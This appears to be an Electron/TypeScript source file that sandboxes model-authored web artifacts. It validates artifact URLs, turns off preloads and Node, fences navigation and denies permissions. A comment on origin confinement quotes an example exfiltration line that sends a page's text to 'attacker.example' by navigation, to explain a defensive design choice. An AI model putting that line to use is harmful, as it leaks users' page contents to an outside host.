/**
 * The two surfaces that show a live artifact, and the one isolation contract
 * both are built from.
 *
 * A live artifact is **model-authored web content served from an origin Rally
 * does not control the contents of**. It is shown in two places — a
 * `WebContentsView` composited over the right rail's preview region, and a
 * pop-out window — and they share one creation path deliberately: two window
 * factories with the same intent drift, and the one that drifts is the one that
 * quietly gains a preload.
 *
 * **The renderer never embeds, fetches, or parses artifact content.** An
 * `<iframe>` would mean widening the renderer's CSP to a wildcard artifact host
 * and grafting remote model-authored content into the application DOM as a
 * navigable, `postMessage`-reachable child — the exact adjacency the backdrop
 * rules forbid. So the main process owns the view, composites it over the
 * rail's rectangle, and the renderer can only *ask for an artifact*: it can
 * never navigate one.
 *
 * See `docs/live-web-artifacts.md` and `docs/security.md`.
 */
import { parseArtifactHost } from '@rally/contracts';
import type { Session } from 'electron';

/**
 * The parts of an Electron view and window this controller touches.
 *
 * Named as capabilities rather than imported as classes so this module holds no
 * runtime `electron` import — which is what lets every decision in it be unit
 * tested, and follows the house pattern of keeping main-process policy separate
 * from the objects it drives. `index.ts` supplies the real thing.
 */
export interface ArtifactViewHandle {
  /**
   * Whether the surface behind this handle is already gone.
   *
   * Part of the contract because a preview outlives nothing: Electron destroys
   * a window's whole view tree with the window, and the window can go at any
   * moment — quitting to install an update closes it out from under a live
   * artifact. Every other method here throws `Object has been destroyed` once
   * that has happened, and thrown from a `closed` handler that is an uncaught
   * exception in the main process, which is a crash dialog rather than a quit.
   * So the controller asks before it acts instead of tearing down blind.
   */
  destroyed(): boolean;
  setBounds(bounds: PreviewBounds): void;
  loadURL(url: string): Promise<void>;
  close(): void;
}

export interface ArtifactHostWindow {
  /** Whether the window is gone; see `ArtifactViewHandle.destroyed`. */
  destroyed(): boolean;
  contentSize(): { width: number; height: number };
  removeView(view: ArtifactViewHandle): void;
}

/** Bounds the renderer reports for the rail's preview region, window-relative. */
export interface PreviewBounds {
  x: number;
  y: number;
  width: number;
  height: number;
}

export interface ArtifactPresentation {
  artifactId: string;
  /** The one-shot access URL; its code lives in the fragment. */
  url: string;
  bounds: PreviewBounds;
}

/**
 * Apply the main process's broad navigation fence without stealing artifact
 * navigation from its stricter, origin-scoped owner.
 *
 * `web-contents-created` installs the broad fence before a `WebContentsView`
 * can be marked as an artifact. The decision therefore happens when the
 * navigation fires. Most importantly, an artifact returns before
 * `preventDefault()`: preventing first and then "deferring" blocked the
 * bootstrap's same-origin redemption POST and left every preview on an empty
 * Opening page.
 */
export function applyGlobalNavigationPolicy(input: {
  event: { preventDefault(): void };
  url: string;
  artifactSurface: boolean;
  rendererAllowed: (url: string) => boolean;
  externalAllowed: (url: string) => boolean;
  openExternal: (url: string) => void;
}): void {
  if (input.rendererAllowed(input.url) || input.artifactSurface) return;
  input.event.preventDefault();
  if (input.externalAllowed(input.url)) input.openExternal(input.url);
}

/**
 * Whether a URL is one this process will load into an artifact surface.
 *
 * The renderer supplies it, so it is checked here rather than trusted: `https:`
 * only, and only on the artifact serving domain. A view that would load
 * anything else is a view that could be pointed at the application's own origin
 * or at an attacker's, which is the whole capability this function withholds.
 *
 * The domain is matched as a suffix on a label boundary rather than by
 * `includes`, so `rallyusercontent.com.evil.test` is refused.
 */
export function isArtifactUrl(candidate: string, servingDomain: string): boolean {
  let url: URL;
  try {
    url = new URL(candidate);
  } catch {
    return false;
  }
  if (url.protocol !== 'https:') return false;
  const host = url.hostname.toLowerCase();
  const domain = servingDomain.toLowerCase();
  const suffix = `.${domain}`;
  if (!host.endsWith(suffix)) return false;
  const label = host.slice(0, -suffix.length);
  if (!label || label.includes('.')) return false;
  return parseArtifactHost(label) !== null;
}

/**
 * Load an artifact's initial URL without mistaking its bootstrap form POST for
 * a network failure. Electron rejects `loadURL()` with `ERR_ABORTED` whenever
 * the loaded page starts a second main-frame navigation before finishing; that
 * is exactly how `/__rally/open` redeems its fragment-held capability.
 */
export async function loadArtifactInitialUrl(loadURL: () => Promise<void>): Promise<boolean> {
  try {
    await loadURL();
    return true;
  } catch (error) {
    return typeof error === 'object' && error !== null && 'code' in error
      && error.code === 'ERR_ABORTED';
  }
}

/**
 * Keep the preview inside the window it is composited over.
 *
 * The renderer measures the rectangle, so a wrong or hostile one would put a
 * view over the whole window — including over chrome a person needs to escape
 * it. Clamping is what makes the bounds a *request* rather than an instruction.
 */
export function clampBounds(bounds: PreviewBounds, window: { width: number; height: number }): PreviewBounds {
  const x = Math.max(0, Math.min(Math.round(bounds.x), window.width));
  const y = Math.max(0, Math.min(Math.round(bounds.y), window.height));
  return {
    x,
    y,
    width: Math.max(0, Math.min(Math.round(bounds.width), window.width - x)),
    height: Math.max(0, Math.min(Math.round(bounds.height), window.height - y)),
  };
}

/**
 * The session partition one artifact's surfaces share.
 *
 * Per artifact, so one artifact's cookies and storage are unreachable from
 * another's — and shared between the rail preview and the pop-out, so a person
 * who authorized the artifact once does not authorize it again when they pop it
 * out.
 */
export function artifactPartition(artifactId: string): string {
  return `persist:artifact-${artifactId}`;
}

/**
 * The web preferences every artifact surface is created with.
 *
 * This is the message-export window's isolation contract with visibility turned
 * on. Each item is load-bearing: **no preload** so there is no bridge to reach,
 * **no Node**, **sandbox on**, **`contextIsolation`**, and a per-artifact
 * partition. Artifact code cannot tell the rail preview from a browser tab,
 * which is exactly the property that makes both safe.
 */
export function artifactWebPreferences(artifactId: string, packaged: boolean) {
  return {
    // Deliberately no `preload`: the renderer's bridge is a capability, and
    // model-authored content is the last content that should hold one.
    partition: artifactPartition(artifactId),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    webSecurity: true,
    allowRunningInsecureContent: false,
    devTools: !packaged,
    spellcheck: false,
  } as const;
}

/**
 * Lock a web contents to one artifact's origin, and deny everything else.
 *
 * Applied to both surfaces from one place. Navigation away is refused, every
 * permission request is denied outright — an artifact has no business asking
 * for a camera, and a prompt that appears to come from Rally is worse than one
 * that never appears — and **nothing the page composes is handed to the system
 * browser**.
 *
 * That last one is a reversal worth stating. Opening an off-origin link
 * externally reads as helpful, and it is how a normal embedded view behaves.
 * But artifact code is model-authored and can put whatever it likes in a URL:
 * `location = "https://attacker.example/?" + document.body.innerText` is a
 * navigation, not a `fetch`, so the CSP's `connect-src` and `form-action` do
 * not touch it — and handing that URL to the person's browser is Rally
 * *performing* the exfiltration the egress fence exists to prevent. A link a
 * person actually wants to follow is a cost paid to close that; they can copy
 * it out of the page.
 */
export function confineToArtifactOrigin(
  contents: {
    on(
      event: 'will-navigate' | 'will-redirect',
      handler: (event: { preventDefault(): void }, url: string) => void,
    ): void;
    setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }): void;
    session: Pick<Session, 'setPermissionRequestHandler'>;
  },
  origin: string,
): void {
  const fence = (event: { preventDefault(): void }, url: string): void => {
    if (sameOrigin(url, origin)) return;
    event.preventDefault();
  };
  contents.on('will-navigate', fence);
  contents.on('will-redirect', fence);
  contents.setWindowOpenHandler(() => ({ action: 'deny' }));
  contents.session.setPermissionRequestHandler((_contents, _permission, callback) => {
    callback(false);
  });
}

function sameOrigin(candidate: string, origin: string): boolean {
  try {
    return new URL(candidate).origin === origin;
  } catch {
    return false;
  }
}


/**
 * The rail's live preview: one view per window, composited over a fixed pane.
 *
 * **At most one exists per window**, and it is destroyed when the detail closes,
 * the work stream changes, or the flag goes off. Two would mean two artifacts
 * painting over one rectangle, and the one underneath would still be running.
 *
 * **Overlays hide it.** A `WebContentsView` composites *above* the renderer's
 * DOM, so any app surface that can overlap the rail — a dialog, the command
 * palette, a lightbox, a menu — would be painted over by artifact content. The
 * renderer reports overlay open and close, and the view is hidden meanwhile.
 * This is the classic embedded-view pitfall and it is handled here so no
 * reviewer has to rediscover it.
 */
export class ArtifactPreviewController {
  private view: ArtifactViewHandle | null = null;
  private artifactId: string | null = null;
  private pendingLoad: { view: ArtifactViewHandle; result: Promise<boolean> } | null = null;
  private bounds: PreviewBounds | null = null;
  private hiddenByOverlay = false;

  constructor(
    private readonly window: ArtifactHostWindow,
    private readonly servingDomain: string,
    private readonly createView: (request: ArtifactPresentation) => ArtifactViewHandle,
  ) {}

  /** Show one artifact in the rail's preview region. */
  async present(request: ArtifactPresentation): Promise<boolean> {
    if (!isArtifactUrl(request.url, this.servingDomain)) return false;
    if (this.window.destroyed()) return false;
    // A view whose contents closed themselves — an artifact page calling
    // `window.close()` — is still held here, and still counts as *this*
    // artifact. Discarding it before the comparison below is what stops a
    // repeat presentation reusing it: nothing would be composited, but this
    // would report success, and the rail reads that as a live preview and
    // renders no fallback over the blank pane.
    if (this.view?.destroyed()) this.destroy();
    if (this.artifactId !== request.artifactId) this.destroy();
    this.bounds = request.bounds;
    if (!this.view) {
      this.view = this.createView(request);
      this.artifactId = request.artifactId;
      const created = this.view;
      this.applyBounds();
      const result = loadArtifactInitialUrl(() => created.loadURL(request.url)).then((loaded) => {
        // DNS, TLS, and terminal navigation failures should not leave an empty
        // composited view. `ERR_ABORTED` is the successful redemption handoff
        // documented by `loadArtifactInitialUrl`, not a terminal failure.
        if (!loaded && this.view === created) this.destroy();
        return loaded;
      });
      this.pendingLoad = { view: created, result };
    }
    const current = this.view;
    if (!current) return false;
    const pending = this.pendingLoad?.view === current ? this.pendingLoad.result : null;
    if (pending && !await pending) return false;
    if (this.pendingLoad?.result === pending) this.pendingLoad = null;
    // A different presentation may have replaced this view while its initial
    // navigation was pending. The old caller must not report the new view as
    // its own success.
    if (this.view !== current || this.artifactId !== request.artifactId) return false;
    this.applyBounds();
    return true;
  }

  /** Move the view when the rail's layout changes. Layout only, never scroll. */
  setBounds(bounds: PreviewBounds): void {
    this.bounds = bounds;
    this.applyBounds();
  }

  /** Called when an app surface that can overlap the rail opens or closes. */
  setOverlayOpen(open: boolean): void {
    this.hiddenByOverlay = open;
    this.applyBounds();
  }

  destroy(): void {
    const view = this.view;
    this.view = null;
    this.artifactId = null;
    this.pendingLoad = null;
    this.bounds = null;
    this.hiddenByOverlay = false;
    if (!view) return;
    // Each guard is about its own object, because the two die independently.
    // A destroyed window has already taken its children with it, so there is
    // nothing to detach — and asking it to would throw. A view whose contents
    // closed themselves is still attached to a live window, so it still has to
    // be detached; it is only closing it a second time that would throw.
    if (!this.window.destroyed()) this.window.removeView(view);
    if (!view.destroyed()) view.close();
  }

  /** For tests and diagnostics: which artifact this window is showing. */
  currentArtifactId(): string | null {
    return this.artifactId;
  }

  private applyBounds(): void {
    if (!this.view || !this.bounds) return;
    if (this.window.destroyed() || this.view.destroyed()) return;
    if (this.hiddenByOverlay) {
      // Collapsed rather than detached: a zero rectangle keeps the page loaded
      // and its state intact, so closing a dialog restores what the person was
      // looking at rather than reloading it under them.
      this.view.setBounds({ x: 0, y: 0, width: 0, height: 0 });
      return;
    }
    this.view.setBounds(clampBounds(this.bounds, this.window.contentSize()));
  }
}
